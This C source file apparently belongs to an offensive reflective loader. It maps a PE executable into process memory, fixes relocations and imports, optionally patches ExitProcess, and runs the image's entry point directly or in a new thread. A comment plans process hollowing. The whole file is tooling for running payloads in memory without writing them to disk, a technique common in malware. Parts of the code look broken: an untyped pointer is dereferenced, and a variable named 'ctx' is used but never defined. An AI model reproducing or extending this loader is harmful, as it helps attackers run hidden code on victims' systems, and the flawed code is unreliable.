#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/loader/loader.h"

BOOL LdrMapExe(LdrInfo info) {
	DBGA("[+] Mapping exe into memory\n");
	
	PIMAGE_OPTIONAL_HEADER pOpt = OPT_HEADER(info.DataPointer);
	PIMAGE_SECTION_HEADER sec   = SECTION_HEADER(info.DataPointer);
	WORD numSections            = FILE_HEADER(info.DataPointer)->NumberOfSections;

	SIZE_T TotalSize  = pOpt->SizeOfImage;
	PVOID BaseAddress = NULL;
	DBGA("[+] Calling NtAllocate\n");
	if(!NT_SUCCESS(ldr->win32->NtAllocateVirtualMemory(CurrentProcess(), &BaseAddress, 0, &TotalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		DBGA("[*] NtAllocate Failed\n");
		return FALSE;
	}
	if (!BaseAddress) {
		DBGA("[*] BaseAddress NULL\n");

		return FALSE;
	}

	LdrMemcpy(BaseAddress, info.DataPointer, pOpt->SizeOfHeaders);
	LdrCopySections(BaseAddress, info.DataPointer, sec, numSections);
	LdrProcessRelocs(BaseAddress, info.DataPointer);
#ifdef LOAD_AND_LISTEN

	LdrPatchExitProcess(BaseAddress);
#endif
	LdrProcessIAT(BaseAddress, info.DataPointer);
	LdrSetSectionPerms(BaseAddress, sec, numSections);

	ULONG_PTR entry = (ULONG_PTR)BaseAddress + pOpt->AddressOfEntryPoint;
	
#ifdef LOAD_AND_EXIT
	DBGA("[*] Jumping to main\n");
	((void(*)())entry)();
#else
	DBGA("[*] Starting Thread\n");
	PVOID Addr = ldr->win32->LocalAlloc(LMEM_INIT | LMEM_FIXED, sizeof(LdrMemContext));
	Addr->BaseAddress = BaseAddress;
	
	HANDLE hThread = ldr->win32->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry, NULL,0, NULL);
	HANDLE hWaitObject = NULL;
	ldr->win32->RegisterWaitForSingleObject(
	    &hWaitObject,
	    hThread,        
	    MemRunCallback,
	    ctx,
	    INFINITE,            
	    WT_EXECUTEONLYONCE
	);
#endif

	return TRUE;
}

BOOL LdrRunExe(LdrInfo info) {
	if (HasReloc(info.DataPointer)) {
		return LdrMapExe(info);
	}
	// TODO: LdrHollowProcess for EXEs without .reloc
	return FALSE;
}
